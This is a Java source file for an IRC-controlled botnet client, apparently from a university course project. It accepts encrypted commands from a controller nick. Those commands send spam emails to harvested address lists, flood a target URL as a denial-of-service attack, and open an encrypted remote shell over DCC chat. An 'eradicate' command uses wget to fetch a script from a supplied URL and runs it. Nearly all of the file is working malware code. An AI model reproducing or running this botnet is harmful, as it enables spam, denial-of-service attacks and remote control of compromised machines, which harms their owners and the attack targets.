import java.io.*;
import java.net.*;
import java.security.Key;
import java.util.*;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.spec.SecretKeySpec;
import javax.mail.*;
import javax.mail.internet.*;

import org.jibble.pircbot.*;

public class BotnetClient extends PircBot {
	private static final String[] COMMANDS = {"shell", "ddos", "spam", "lease"};
	private static final String[] LEASE_COMMANDS = {"ddos", "spam"};
	
	private static final String SENTINEL = "$: ";
	private static final String TERMINATION = "exit";
	private static final boolean DEBUG = true;
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "bot";
	private static final String CC = "RandR";
	private static final String TEMPLATE = "template.txt";
	private static final String EMAILS = "emails.txt";
	private static final String RANDOM_EMAILS = "random_emails.txt";
	private static final int PORT = 6667;
	private String uuid;
	private String id;
	private String operator;

	private Key startKey;
	
	private Key privKey;
	
	private MsgEncrypt m;
	
	public static void main(String[] args) {
		BotnetClient bn = new BotnetClient();
	}
	
	public BotnetClient() {
		uuid = UUID.randomUUID().toString();
		id = NAME + "_" + uuid;
		try {
			setVerbose(DEBUG);
			setName(id);
			setMessageDelay(0);
			connect(SERVER, PORT);
		} catch (NickAlreadyInUseException e) {
			uuid = UUID.randomUUID().toString();
			id = NAME + "_" + uuid;
			changeNick(id);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	protected void onConnect() {
		joinChannel(CHANNEL);
		setMode(CHANNEL, "+s");
	}
	
	private String[] getEmails(String fileName) {
		try {
			List<String> list = new ArrayList<String>();
			Scanner in = new Scanner(new File(fileName));
			while (in.hasNextLine()) {
				String line = in.nextLine();
				if (!line.isEmpty()) {
					list.add(line.trim());
				}
			}
			return list.toArray(new String[0]);
		} catch (Exception e) {
			System.out.println(e.getMessage());
			return null;
		}
	}
		
	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
		if (sender.equals(CC)) {
			try {
				// TODO: maybe need to put this back
				//System.out.println(message);
				message = m.decryptMsg(message);
				//System.out.println(message);
				if (message.toLowerCase().startsWith("spam")) {
					String[] parts = message.split("'");
					if (parts.length < 9) {
						System.out.println("bad spam message: " + message);
					} else {
						String x = parts[1];
						String y = parts[3];
						String z = parts[5];
						String subject = parts[7];
						String emails = parts[8].trim();
						
						String[] to;
						if (emails.toLowerCase().equals("random")) {
							to = getEmails(RANDOM_EMAILS);
						} else if (emails.toLowerCase().equals("all")) {
							to = getEmails(EMAILS);
						} else {
							to = emails.split(" ");
						}
						String body = "";
						try {
							Scanner in = new Scanner(new File(TEMPLATE));
							while (in.hasNextLine()) {
								body += in.nextLine() + "\n";
							}
						} catch (Exception e) {
							System.out.println("There were problems reading " + TEMPLATE);
						}
						body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
						sendEmail(to, subject, body);
					}
				} else if (message.toLowerCase().startsWith("ddos")) {
					System.out.println(sender + ": " + message);
					String[] parts = message.split(" ");
					if (parts.length < 4) {
						System.out.println("Bad ddos message provided");
					} else {
						DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
					}
				} else if (message.toLowerCase().startsWith("lease")) {
					System.out.println("Leasing Myself");
				} else if (message.toLowerCase().startsWith("eradicate")) {
					String[] parts = message.split(" ");
					if (parts.length > 1) {
						String url = parts[1];
						Process p = Runtime.getRuntime().exec("/bin/sh");
						PrintWriter in = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())));
						in.println("wget -O clean.sh " + url + " > temp; chmod +x clean.sh > temp; ./clean.sh > temp; exit 0;");
						p.waitFor();
						System.out.println("ran clean script with exit code " + p.exitValue());
						System.exit(0);
					}
				} else if (message.toLowerCase().startsWith("kill")) {
					System.exit(0);	
				} else {
					System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
				}
			} catch (Exception e) {
				e.printStackTrace();
				System.out.println("There was problems decrypting the message");
			}
		} else {
			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
		}
	}
	
	protected void onOp(String channel, String sourceNick, String sourceLogin, String sourceHostname, String recipient) {
		operator = recipient;
	}
	
	protected void onJoin(String channel, String sender, String login, String hostname) {
		if (sender.equals(CC)) {
			op(CHANNEL, sender);
			deOp(CHANNEL, id);
			System.out.println("Operator status given to " + CC);
		}
	}
	
	protected void onIncomingFileTransfer(DccFileTransfer transfer) {
		if (transfer.getNick().equals(CC)) {
			String fileName = transfer.getFile().getName();
			System.out.println("Receiving file: " + fileName);
			if (fileName.equals(TEMPLATE) || fileName.equals(EMAILS)) {
				transfer.receive(new File(fileName), false);
			} else {
				String response = "Expecting file of name " + TEMPLATE + " or " + EMAILS;
				this.sendMessage(CC, m.encryptMsg(response));
			}
		} else {
			System.out.println(transfer.getNick() + "<" + transfer.getNumericalAddress() + "> tried to send me " + transfer.getFile().getAbsolutePath());
		}
	}
	
	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
		if (e != null) {
			System.out.println(e.getMessage());
		} else {
			String fileName = transfer.getFile().getName();
			System.out.println("Received file: " + fileName);
		}
	}
	
	private void sendEmail(String[] to, String subject, String body) {
		Runtime r = Runtime.getRuntime();
		try {
			String emails = "";
			for (String email : to) {
				emails += " " + email;
			}
			
			body = body.replace("\"", "\\\"").replace("\n", "\\n").replace("'", "\"");
			String emailCommand = "echo -e '" + body + "' | mutt -s \"" + subject + "\"" + emails;
			Process p = r.exec("/bin/sh");
			
			PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
			out.println(emailCommand);
			out.println("exit");
			
			p.waitFor();
			
			System.out.println("echo -e \"" + body + "\" | mutt -s \"" + subject + "\"" + emails);
			System.out.println("Email sent to" + emails + " with exit code " + p.exitValue());
			
		} catch(Exception e) {
			e.printStackTrace();
		}
	}

	protected void onIncomingChatRequest(DccChat chat) {
		if (chat == null) {
			System.out.println("Chat failed, passed null.");
		} else {
			try {
				if (!chat.getNick().equalsIgnoreCase(CC)) {
					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
				} else {
					chat.accept();
					String command = chat.readLine();
					if (command.equalsIgnoreCase("key")) {
						//Read the key info using char.readLine(); 
						String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
						//System.out.println("key: " + otherKey);
						String info = chat.readLine();
						//System.out.println("info: " + info);
						m = MsgEncrypt.getInstance();
						m.setPubParams(info);
						m.handShake(otherKey);
						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
						chat.close();
					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
						//Create the bash shell
						Runtime r = Runtime.getRuntime();
						Process p = r.exec("/bin/sh");
	
						//Gather the input/output stream to the bash shell process
						PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
						BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
						BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
						
						//Send input commands to the process in a separate thread
						ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
						inputThread.start();
						
						ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
						errorThread.start();
						
			        	//print the results only
		        		while (inputThread.isAlive()) {
		        			String s = bashout.readLine();
		        			while (s != null && !s.equals(SENTINEL)) {
		        				// TODO: maybe need to change this
		        				//System.out.println(s);
		        				//String encS = startMsgE.encryptMsg(s);
		        				//System.out.println(encS);
		        				//chat.sendLine(encS);
		        				//chat.sendLine(s);
		        				String encM = m.encryptMsg(s);
		        				chat.sendLine(encM);
		        				System.out.println("bash response: " + s + "\n\tE(m): " + encM);
		        				s = bashout.readLine();
		        			}
		        			//chat.sendLine(s);
		        			chat.sendLine(m.encryptMsg(s));
		        			//System.out.println(s);
		        			//System.out.println(startMsgE.encryptMsg(s));
		        			//chat.sendLine(startMsgE.encryptMsg(s));
		        		}
			        	chat.close();
			        	inputThread.kill();
			        	errorThread.kill();
			        	p.destroy();
					    System.out.println("Closed the bash shell");
					}
				}
			} catch(Exception e) {
				System.out.println(e.getMessage());
			}
		}
	}
	
	//This class performs a ddos attack against the specified url
	private class DdosThread extends Thread {
		private URL url;
		private long duration;
		private long interval;
		private boolean terminate;
		
		public DdosThread(String url, int interval, int duration) {
			this.duration = duration * 1000;
			this.interval = interval * 1000;
			terminate = false;
			try {
				this.url = new URL(url);
				this.start();
			} catch (Exception e) {
				System.out.println("Malformed URL string");
			}
		}
		public void kill() {
			terminate = true;
		}
		public void run() {
			int times = (int)(Math.round(duration * 1.0 / interval));
			int performed = 0;
			long sleeptime = (long)(Math.round(duration * 1.0 / times));
			while (!terminate && performed < times) {
				try {
					URLConnection connect = url.openConnection();
					Scanner in = new Scanner(new BufferedReader(new InputStreamReader(connect.getInputStream())));
					if (in.hasNextLine()) {
						System.out.println((System.currentTimeMillis() / 1000) + ": " + in.nextLine());
					}
					while (in.hasNextLine()) {
						in.nextLine();
					}
					DdosThread.sleep(sleeptime);
				} catch (InterruptedException e) {
					System.out.println(e.getMessage());
				} catch (Exception e) {
					System.out.println("There was a problem connecting to " + url.toString());
				}
				performed++;
			}
		}
	}
	
	//This class passes input from the chat object (the master bot) to the bash shell
	private class ProcessInputThread extends Thread {
		private static final String TERMINATION = "exit";
	    private DccChat chat;
	    private PrintWriter bashin;
	    private boolean terminate;
	    
	    public ProcessInputThread(DccChat chat, PrintWriter writer) {
	        this.chat = chat;
	        bashin = writer;
	        terminate = false;
	    }
	    
	    public void kill() {
	    	terminate = true;
	    }

	    public void run() {
	    	try {
	    		bashin.println("echo `pwd` '$: '");
		    	// TODO: make decrypted
	    		//String encCommand = chat.readLine();
	    		//String command = startMsgE.decryptMsg(encCommand);
	    		//System.out.println(encCommand);
	    		//System.out.println(command);
	    		//String command = chat.readLine();
	        	String command = m.decryptMsg(chat.readLine());
	    		while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
	        		System.out.println("command: " + command);
	        		bashin.println(command);
	        		bashin.println("echo `pwd` '$: '");
	        		//command = chat.readLine();
	        		command = m.decryptMsg(chat.readLine());
	        		//encCommand = chat.readLine();
	        		//command = startMsgE.decryptMsg(encCommand);
	        	}
	        	bashin.println("exit 0");
	    	} catch (Exception e) {
	            System.out.println(e.getMessage());
	        }
	    	System.out.println("Done feeding output from the bash shell to the master bot");
	    }
	}
	
	//This class passes error output from the bash shell to the chat object (the master bot)
	private class ProcessErrorThread extends Thread {
	    private DccChat chat;
	    private BufferedReader bashin;
	    private boolean terminate;
	    
	    public ProcessErrorThread(DccChat chat, BufferedReader writer) {
	        this.chat = chat;
	        bashin = writer;
	        terminate = false;
	    }
	    
	    public void kill() {
	    	terminate = true;
	    }

	    public void run() {
	    	try {
	    		String s = "";
	        	while (!terminate) {
	        		s = bashin.readLine();
	        		if (s != null) {
	        			String encM = m.encryptMsg(s);
	        			System.out.println("error: " + s + "\n\tE(m): " + encM);
	        			//chat.sendLine(s);
	        			chat.sendLine(encM);
	        		}
	        	}
	    	} catch (Exception e) {
	            System.out.println(e.getMessage());
	        }
	    	System.out.println("Done feeding error output from the bash shell to the master bot");
	    }
	}
}